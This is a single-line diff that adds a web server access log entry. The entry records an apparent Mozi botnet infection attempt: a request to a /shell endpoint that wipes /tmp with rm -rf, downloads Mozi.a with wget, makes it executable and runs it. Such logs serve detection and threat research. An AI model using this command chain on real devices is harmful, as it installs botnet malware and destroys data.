@@ -1,0 +1,1 @@
+79.101.58.38 - - [22/Feb/2020:23:24:15 +0200] "GET /shell?cd+/tmp;rm+-rf+*;wget+http://192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1" 301 162 "-" "-" "Hello, world"
